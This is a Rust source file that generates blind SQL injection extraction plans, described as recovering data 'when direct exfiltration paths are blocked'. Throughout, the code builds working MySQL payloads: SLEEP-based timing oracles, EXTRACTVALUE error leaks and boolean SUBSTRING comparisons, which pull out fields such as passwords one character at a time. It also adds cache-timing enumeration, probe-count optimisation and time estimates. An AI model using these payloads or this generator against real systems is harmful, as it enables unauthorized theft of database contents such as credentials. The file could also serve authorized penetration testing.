/// Side-channel data extraction planner.
///
/// Generates extraction plans for recovering data through timing oracles,
/// error-based leaks, behavioral differences, and cache timing when direct
/// exfiltration paths are blocked. Each plan produces a sequence of
/// [`ExtractionProbe`]s that, when executed against a target, reveal one
/// character or bit of the target data per probe response.
use std::collections::HashSet;
use std::fmt;

// ---------------------------------------------------------------------------
// Enums
// ---------------------------------------------------------------------------

/// Side-channel extraction technique.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum SideChannelTechnique {
    TimingOracle,
    ErrorBased,
    BehavioralExtraction,
    CacheTiming,
}

impl fmt::Display for SideChannelTechnique {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::TimingOracle => write!(f, "timing-oracle"),
            Self::ErrorBased => write!(f, "error-based"),
            Self::BehavioralExtraction => write!(f, "behavioral-extraction"),
            Self::CacheTiming => write!(f, "cache-timing"),
        }
    }
}

/// What response characteristic indicates a successful probe.
#[derive(Debug, Clone, PartialEq)]
pub enum ResponseIndicator {
    TimingThreshold { min_ms: u64, max_ms: u64 },
    StatusCode(u16),
    ErrorMessage(String),
    BodyContains(String),
    BodyLength { min: usize, max: usize },
    CacheHit,
    CacheMiss,
}

impl fmt::Display for ResponseIndicator {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::TimingThreshold { min_ms, max_ms } => {
                write!(f, "timing {min_ms}–{max_ms}ms")
            }
            Self::StatusCode(code) => write!(f, "status {code}"),
            Self::ErrorMessage(msg) => write!(f, "error contains \"{msg}\""),
            Self::BodyContains(s) => write!(f, "body contains \"{s}\""),
            Self::BodyLength { min, max } => write!(f, "body length {min}–{max}"),
            Self::CacheHit => write!(f, "cache hit"),
            Self::CacheMiss => write!(f, "cache miss"),
        }
    }
}

/// Predefined character sets for extraction.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum CharacterSet {
    Alphanumeric,
    Printable,
    Hex,
    Numeric,
    Custom(Vec<char>),
}

impl fmt::Display for CharacterSet {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Alphanumeric => write!(f, "alphanumeric (62 chars)"),
            Self::Printable => write!(f, "printable ASCII (95 chars)"),
            Self::Hex => write!(f, "hex (16 chars)"),
            Self::Numeric => write!(f, "numeric (10 chars)"),
            Self::Custom(chars) => write!(f, "custom ({} chars)", chars.len()),
        }
    }
}

// ---------------------------------------------------------------------------
// Error
// ---------------------------------------------------------------------------

/// Errors returned by extraction planning functions.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum SideChannelError {
    InvalidConfig(String),
    UnsupportedTechnique(String),
    CharsetEmpty,
    MaxLengthZero,
}

impl fmt::Display for SideChannelError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::InvalidConfig(msg) => write!(f, "invalid config: {msg}"),
            Self::UnsupportedTechnique(msg) => write!(f, "unsupported technique: {msg}"),
            Self::CharsetEmpty => write!(f, "character set is empty"),
            Self::MaxLengthZero => write!(f, "max_length must be greater than zero"),
        }
    }
}

impl std::error::Error for SideChannelError {}

// ---------------------------------------------------------------------------
// Structs
// ---------------------------------------------------------------------------

/// A single extraction probe — tests one character/bit of the target data.
#[derive(Debug, Clone)]
pub struct ExtractionProbe {
    /// Technique this probe belongs to.
    pub technique: SideChannelTechnique,
    /// Character/byte position being extracted (1-indexed, matching SQL SUBSTRING).
    pub position: usize,
    /// The value being tested (e.g. a single character `"a"`).
    pub test_value: String,
    /// Injection payload for this probe.
    pub payload: String,
    /// What response characteristic indicates "correct guess".
    pub expected_indicator: ResponseIndicator,
}

/// Strategy for timing-oracle extraction.
#[derive(Debug, Clone)]
pub struct TimingOracleStrategy {
    pub injection_template: String,
    pub delay_seconds: f64,
    pub threshold_ms: u64,
    pub charset: Vec<char>,
    pub max_length: usize,
    pub probes: Vec<ExtractionProbe>,
}

/// Strategy for error-based extraction.
#[derive(Debug, Clone)]
pub struct ErrorBasedStrategy {
    pub injection_template: String,
    pub error_pattern: String,
    pub charset: Vec<char>,
    pub max_length: usize,
    pub probes: Vec<ExtractionProbe>,
}

/// Strategy for behavioral (boolean-blind) extraction.
#[derive(Debug, Clone)]
pub struct BehavioralStrategy {
    pub injection_template: String,
    pub true_indicator: ResponseIndicator,
    pub false_indicator: ResponseIndicator,
    pub charset: Vec<char>,
    pub max_length: usize,
    pub probes: Vec<ExtractionProbe>,
}

/// Strategy for cache-timing extraction.
#[derive(Debug, Clone)]
pub struct CacheTimingStrategy {
    pub resource_template: String,
    pub valid_indicator: ResponseIndicator,
    pub invalid_indicator: ResponseIndicator,
    pub test_values: Vec<String>,
    pub probes: Vec<ExtractionProbe>,
}

/// Complete side-channel extraction plan.
#[derive(Debug, Clone)]
pub struct ExtractionPlan {
    pub technique: SideChannelTechnique,
    pub target_description: String,
    pub total_probes: usize,
    pub estimated_time_ms: u64,
    pub probes: Vec<ExtractionProbe>,
    pub optimization_notes: Vec<String>,
}

/// Configuration for extraction planning.
#[derive(Debug, Clone)]
pub struct ExtractionConfig {
    /// Technique to use.
    pub technique: SideChannelTechnique,
    /// What data to extract (e.g. `"@@version"`, `"password"`).
    pub target_field: String,
    /// Maximum length to extract.
    pub max_length: usize,
    /// Character set to search.
    pub charset: CharacterSet,
    /// Where to inject (URL param, header, cookie, etc.).
    pub injection_point: String,
}

/// Time estimate for executing an extraction plan.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ExtractionTimeEstimate {
    pub best_case_ms: u64,
    pub worst_case_ms: u64,
    pub average_case_ms: u64,
    pub total_probes: usize,
    pub probes_per_character: usize,
}

// ---------------------------------------------------------------------------
// Private helpers
// ---------------------------------------------------------------------------

const DEFAULT_DELAY_SECONDS: f64 = 2.0;
const DEFAULT_THRESHOLD_MS: u64 = 2000;
const NETWORK_OVERHEAD_MS: u64 = 100;
const ERROR_PROBE_MS: u64 = 50;
const BEHAVIORAL_PROBE_MS: u64 = 80;
const CACHE_PROBE_MS: u64 = 30;

fn resolve_charset(cs: &CharacterSet) -> Vec<char> {
    match cs {
        CharacterSet::Alphanumeric => {
            let mut chars: Vec<char> = ('a'..='z').collect();
            chars.extend('A'..='Z');
            chars.extend('0'..='9');
            chars
        }
        CharacterSet::Printable => (32u8..=126).map(|b| b as char).collect(),
        CharacterSet::Hex => {
            let mut chars: Vec<char> = ('0'..='9').collect();
            chars.extend('a'..='f');
            chars
        }
        CharacterSet::Numeric => ('0'..='9').collect(),
        CharacterSet::Custom(chars) => chars.clone(),
    }
}

fn validate_config(config: &ExtractionConfig) -> Result<Vec<char>, SideChannelError> {
    if config.max_length == 0 {
        return Err(SideChannelError::MaxLengthZero);
    }
    let charset = resolve_charset(&config.charset);
    if charset.is_empty() {
        return Err(SideChannelError::CharsetEmpty);
    }
    if config.target_field.is_empty() {
        return Err(SideChannelError::InvalidConfig(
            "target_field must not be empty".into(),
        ));
    }
    Ok(charset)
}

fn is_charset_ordered(chars: &[char]) -> bool {
    chars.windows(2).all(|w| w[0] <= w[1])
}

// ---------------------------------------------------------------------------
// Plan builders
// ---------------------------------------------------------------------------

/// Create a timing-oracle extraction plan.
///
/// Generates one probe per (position, charset character). Each probe injects a
/// SQL `SLEEP`/`BENCHMARK` payload that delays the response when the guessed
/// character matches the actual value at that position.
pub fn plan_timing_oracle(config: &ExtractionConfig) -> Result<ExtractionPlan, SideChannelError> {
    let charset = validate_config(config)?;
    let delay = DEFAULT_DELAY_SECONDS;
    let threshold = DEFAULT_THRESHOLD_MS;

    let mut probes = Vec::with_capacity(config.max_length * charset.len());

    for pos in 1..=config.max_length {
        for ch in &charset {
            let payload = format!(
                "' AND IF(SUBSTRING({},{},1)='{}',SLEEP({}),0)-- -",
                config.target_field, pos, ch, delay as u64,
            );
            probes.push(ExtractionProbe {
                technique: SideChannelTechnique::TimingOracle,
                position: pos,
                test_value: ch.to_string(),
                payload,
                expected_indicator: ResponseIndicator::TimingThreshold {
                    min_ms: threshold,
                    max_ms: threshold + 3000,
                },
            });
        }
    }

    let total_probes = probes.len();
    let time_per_probe = (delay * 1000.0) as u64 + NETWORK_OVERHEAD_MS;
    let estimated_time_ms = total_probes as u64 * time_per_probe;

    let mut notes = vec![format!(
        "Timing oracle: {} positions × {} charset = {} probes",
        config.max_length,
        charset.len(),
        total_probes,
    )];
    if is_charset_ordered(&charset) {
        notes.push(
            "Charset is ordered — binary search could reduce per-position \
             probes from O(n) to O(log n)"
                .into(),
        );
    }

    Ok(ExtractionPlan {
        technique: SideChannelTechnique::TimingOracle,
        target_description: format!(
            "Extract '{}' via timing oracle at {}",
            config.target_field, config.injection_point,
        ),
        total_probes,
        estimated_time_ms,
        probes,
        optimization_notes: notes,
    })
}

/// Create an error-based extraction plan.
///
/// Only one probe per position because the actual character value leaks inside
/// the error message itself — no need to iterate the charset.
pub fn plan_error_based_extraction(
    config: &ExtractionConfig,
) -> Result<ExtractionPlan, SideChannelError> {
    let _charset = validate_config(config)?;

    let mut probes = Vec::with_capacity(config.max_length);

    for pos in 1..=config.max_length {
        let payload = format!(
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT SUBSTRING({},{},1))))-- -",
            config.target_field, pos,
        );
        probes.push(ExtractionProbe {
            technique: SideChannelTechnique::ErrorBased,
            position: pos,
            test_value: String::new(),
            payload,
            expected_indicator: ResponseIndicator::ErrorMessage("XPATH syntax error: '~".into()),
        });
    }

    let total_probes = probes.len();
    let estimated_time_ms = total_probes as u64 * ERROR_PROBE_MS;

    Ok(ExtractionPlan {
        technique: SideChannelTechnique::ErrorBased,
        target_description: format!(
            "Extract '{}' via error-based leak at {}",
            config.target_field, config.injection_point,
        ),
        total_probes,
        estimated_time_ms,
        probes,
        optimization_notes: vec![format!(
            "Error-based: 1 probe per position × {} positions = {} probes \
             (character leaks directly in error)",
            config.max_length, total_probes,
        )],
    })
}

/// Create a behavioral (boolean-blind) extraction plan.
///
/// Each probe injects a condition that evaluates to true when the guessed
/// character matches. The application's differing response (status code, body
/// length, content) reveals the answer.
pub fn plan_behavioral_extraction(
    config: &ExtractionConfig,
) -> Result<ExtractionPlan, SideChannelError> {
    let charset = validate_config(config)?;

    let mut probes = Vec::with_capacity(config.max_length * charset.len());

    for pos in 1..=config.max_length {
        for ch in &charset {
            let payload = format!(
                "' AND SUBSTRING({},{},1)='{}'-- -",
                config.target_field, pos, ch,
            );
            probes.push(ExtractionProbe {
                technique: SideChannelTechnique::BehavioralExtraction,
                position: pos,
                test_value: ch.to_string(),
                payload,
                expected_indicator: ResponseIndicator::StatusCode(200),
            });
        }
    }

    let total_probes = probes.len();
    let estimated_time_ms = total_probes as u64 * BEHAVIORAL_PROBE_MS;

    let mut notes = vec![format!(
        "Behavioral: {} positions × {} charset = {} probes",
        config.max_length,
        charset.len(),
        total_probes,
    )];
    if is_charset_ordered(&charset) {
        notes.push(
            "Charset is ordered — binary search applicable via \
             ASCII comparison operators (>, <)"
                .into(),
        );
    }

    Ok(ExtractionPlan {
        technique: SideChannelTechnique::BehavioralExtraction,
        target_description: format!(
            "Extract '{}' via behavioral differences at {}",
            config.target_field, config.injection_point,
        ),
        total_probes,
        estimated_time_ms,
        probes,
        optimization_notes: notes,
    })
}

/// Create a cache-timing extraction plan.
///
/// Tests whether resources exist by observing cache behavior (hit vs miss).
/// Useful for user enumeration, path discovery, and similar recon tasks.
pub fn plan_cache_timing_extraction(
    config: &ExtractionConfig,
) -> Result<ExtractionPlan, SideChannelError> {
    let charset = validate_config(config)?;

    let test_values: Vec<String> = charset.iter().map(|c| c.to_string()).collect();
    let mut probes = Vec::with_capacity(config.max_length * test_values.len());

    for pos in 1..=config.max_length {
        for val in &test_values {
            let resource = format!("{}/{}{}", config.injection_point, config.target_field, val,);
            probes.push(ExtractionProbe {
                technique: SideChannelTechnique::CacheTiming,
                position: pos,
                test_value: val.clone(),
                payload: resource,
                expected_indicator: ResponseIndicator::CacheHit,
            });
        }
    }

    let total_probes = probes.len();
    let estimated_time_ms = total_probes as u64 * CACHE_PROBE_MS;

    Ok(ExtractionPlan {
        technique: SideChannelTechnique::CacheTiming,
        target_description: format!(
            "Enumerate '{}' via cache timing at {}",
            config.target_field, config.injection_point,
        ),
        total_probes,
        estimated_time_ms,
        probes,
        optimization_notes: vec![format!(
            "Cache timing: {} test values × {} positions = {} probes",
            test_values.len(),
            config.max_length,
            total_probes,
        )],
    })
}

// ---------------------------------------------------------------------------
// Optimization
// ---------------------------------------------------------------------------

/// Optimize an extraction plan by deduplicating probes and annotating with
/// binary-search suggestions when the charset is ordered.
pub fn optimize_extraction_plan(plan: &ExtractionPlan) -> ExtractionPlan {
    let mut seen = HashSet::new();
    let deduped: Vec<ExtractionProbe> = plan
        .probes
        .iter()
        .filter(|p| {
            let key = (p.position, p.test_value.clone(), p.payload.clone());
            seen.insert(key)
        })
        .cloned()
        .collect();

    let removed = plan.probes.len() - deduped.len();

    let mut notes = plan.optimization_notes.clone();
    if removed > 0 {
        notes.push(format!("Removed {removed} duplicate probes"));
    }

    let charset_ordered = {
        let mut chars_by_pos: std::collections::HashMap<usize, Vec<char>> =
            std::collections::HashMap::new();
        for probe in &deduped {
            if let Some(ch) = probe.test_value.chars().next() {
                chars_by_pos.entry(probe.position).or_default().push(ch);
            }
        }
        chars_by_pos.values().all(|chars| is_charset_ordered(chars))
    };

    if charset_ordered
        && matches!(
            plan.technique,
            SideChannelTechnique::TimingOracle | SideChannelTechnique::BehavioralExtraction
        )
    {
        let has_binary_note = notes.iter().any(|n| n.contains("binary search"));
        if !has_binary_note {
            notes.push(
                "Binary search optimization available — ordered charset \
                 enables O(log n) probes per position instead of O(n)"
                    .into(),
            );
        }
    }

    let scale = deduped.len() as f64 / plan.probes.len().max(1) as f64;
    let estimated_time_ms = (plan.estimated_time_ms as f64 * scale) as u64;

    ExtractionPlan {
        technique: plan.technique,
        target_description: plan.target_description.clone(),
        total_probes: deduped.len(),
        estimated_time_ms,
        probes: deduped,
        optimization_notes: notes,
    }
}

// ---------------------------------------------------------------------------
// Time estimation
// ---------------------------------------------------------------------------

/// Estimate execution time for an extraction plan.
pub fn estimate_extraction_time(plan: &ExtractionPlan) -> ExtractionTimeEstimate {
    let total = plan.total_probes;
    if total == 0 {
        return ExtractionTimeEstimate {
            best_case_ms: 0,
            worst_case_ms: 0,
            average_case_ms: 0,
            total_probes: 0,
            probes_per_character: 0,
        };
    }

    let distinct_positions: HashSet<usize> = plan.probes.iter().map(|p| p.position).collect();
    let num_positions = distinct_positions.len().max(1);
    let probes_per_char = total / num_positions;

    let per_probe_ms = match plan.technique {
        SideChannelTechnique::TimingOracle => {
            DEFAULT_DELAY_SECONDS as u64 * 1000 + NETWORK_OVERHEAD_MS
        }
        SideChannelTechnique::ErrorBased => ERROR_PROBE_MS,
        SideChannelTechnique::BehavioralExtraction => BEHAVIORAL_PROBE_MS,
        SideChannelTechnique::CacheTiming => CACHE_PROBE_MS,
    };

    let best_case_ms = num_positions as u64 * per_probe_ms;
    let worst_case_ms = total as u64 * per_probe_ms;
    let average_case_ms = (best_case_ms + worst_case_ms) / 2;

    ExtractionTimeEstimate {
        best_case_ms,
        worst_case_ms,
        average_case_ms,
        total_probes: total,
        probes_per_character: probes_per_char,
    }
}
